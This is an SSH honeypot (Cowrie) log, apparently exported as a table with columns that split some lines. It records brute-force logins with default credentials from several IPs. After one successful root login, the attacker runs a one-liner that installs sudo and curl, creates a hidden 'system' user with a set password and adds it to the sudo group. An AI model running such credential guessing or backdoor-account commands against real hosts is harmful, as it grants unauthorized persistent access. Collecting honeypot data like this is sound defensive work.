2023-11-27T04:04:03+0000	[-] Python Version 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0]	Unnamed: 2	Unnamed: 3	Unnamed: 4
2023-11-29T06:47:48+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'opc' trying auth b'password'			
2023-11-29T06:47:48+0000	[HoneyPotSSHTransport,291,146.190.63.65] Could not read etc/userdb.txt, default database activated			
2023-11-29T06:47:48+0000	[HoneyPotSSHTransport,291,146.190.63.65] login attempt [b'opc'/b'solaris_opc'] failed			
2023-11-29T06:47:49+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'opc' failed auth b'password'			
2023-11-29T06:47:49+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()			
2023-11-29T06:47:49+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost			
2023-11-29T06:47:49+0000	[HoneyPotSSHTransport,291,146.190.63.65] Connection lost after 1 seconds			
2023-11-29T06:53:23+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha1			
2023-11-29T06:53:23+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha256			
2023-11-29T06:53:23+0000	[cowrie.ssh.factory.CowrieSSHFactory] New connection: 146.190.63.65:38864 (172.17.0.2:2222) [session:	3	968	e56cd762]
2023-11-29T06:53:23+0000	[HoneyPotSSHTransport,292,146.190.63.65] Remote SSH version: SSH-2.0-Go			
2023-11-29T06:53:23+0000	[HoneyPotSSHTransport,292,146.190.63.65] SSH client hassh fingerprint: 4e066189c3bbeec38c99b185511373	3a		
2023-11-29T06:53:23+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-n	is	tp2	56'
2023-11-29T06:53:23+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'			
2023-11-29T06:53:23+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'			
2023-11-29T06:53:23+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS			
2023-11-29T06:53:23+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'			
2023-11-29T06:53:23+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'none'			
2023-11-29T06:53:23+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'			
2023-11-29T06:53:23+0000	[HoneyPotSSHTransport,292,146.190.63.65] Could not read etc/userdb.txt, default database activated			
2023-11-29T06:53:23+0000	[HoneyPotSSHTransport,292,146.190.63.65] login attempt [b'root'/b'root'] failed			
2023-11-29T06:53:24+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' failed auth b'password'			
2023-11-29T06:53:24+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()			
2023-11-29T06:53:24+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost			
2023-11-29T06:53:24+0000	[HoneyPotSSHTransport,292,146.190.63.65] Connection lost after 1 seconds			
2023-11-29T06:53:33+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha1			
2023-11-29T06:53:33+0000	[cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha256			
2023-11-29T06:53:33+0000	[cowrie.ssh.factory.CowrieSSHFactory] New connection: 170.64.136.165:45430 (172.17.0.2:2222) [session	:	293	88a6d743a]
2023-11-29T06:53:33+0000	[HoneyPotSSHTransport,293,170.64.136.165] Remote SSH version: SSH-2.0-Go			
2023-11-29T06:53:33+0000	[HoneyPotSSHTransport,293,170.64.136.165] SSH client hassh fingerprint: 4e066189c3bbeec38c99b18551137	33	a	
2023-11-29T06:53:33+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-n	is	tp2	56'
2023-11-29T06:53:33+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'			
2023-11-29T06:53:33+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'			
2023-11-29T06:53:34+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS			
2023-11-29T06:53:34+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'			
2023-11-29T06:53:35+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'none'			
2023-11-29T06:53:36+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'			
2023-11-29T06:53:36+0000	[HoneyPotSSHTransport,293,170.64.136.165] Could not read etc/userdb.txt, default database activated			
2023-11-29T06:53:36+0000	[HoneyPotSSHTransport,293,170.64.136.165] login attempt [b'root'/b'0'] succeeded			
2023-11-29T06:53:36+0000	[HoneyPotSSHTransport,293,170.64.136.165] Initialized emulated server as architecture: linux-x64-lsb			
2023-11-29T06:53:36+0000	[cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' authenticated with b'password'			
2023-11-29T06:53:36+0000	[cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-connection'			
2023-11-29T06:53:36+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request			
2023-11-29T06:53:36+0000	[cowrie.ssh.session.HoneyPotSSHSession#info] channel open			
2023-11-29T06:53:37+0000	"[twisted.conch.ssh.session#info] Executing command ""b'apt update && apt install sudo curl -y && sudo"	us	era	"dd -m -p $(openssl passwd -1 BwWReWcu) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system'"""
2023-11-29T06:53:37+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,293,170.64.136.165] C	MD	: a	pt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 BwWReWcu) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system
2023-11-29T06:53:37+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,293,170.64.136.165] C	MD	: o	penssl passwd -1 BwWReWcu
2023-11-29T06:53:37+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,293,170.64.136.165] C	an	't	find command openssl
2023-11-29T06:53:37+0000	[SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,293,170.64.136.165] C	om	man	d not found: openssl passwd -1 BwWReWcu
2023-11-29T06:53:37+0000	[twisted.conch.ssh.session#info] exitCode: 0			
2023-11-29T06:53:37+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'			
2023-11-29T06:53:37+0000	[cowrie.ssh.connection.CowrieSSHConnection#info] sending close 0			
